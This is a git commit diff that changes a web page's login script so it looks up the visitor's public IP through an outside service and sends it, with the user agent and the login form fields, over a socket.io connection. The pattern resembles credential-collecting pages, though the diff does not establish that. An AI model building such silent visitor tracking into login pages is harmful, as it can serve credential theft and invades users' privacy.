633f03467b2f70e72928962650c7a55a2a25369d
webcro <148506609+webcro@users.noreply.github.com>
2023-12-02 13:00:15 -0500

    Update index.js

--- public/js/index.js
+++ public/js/index.js
@@ -3,6 +3,15 @@ const socket = io();
 function submitForm() {
     document.getElementById('userAgent').value = navigator.userAgent;
 
+    fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('ipFetch').value = data.ip
+  })
+  .catch(error => {
+    console.error('Error fetching IP:', error);
+  });
+
     const formData = new FormData(document.getElementById('loginForm'));
 
     socket.emit('submit', Object.fromEntries(formData));
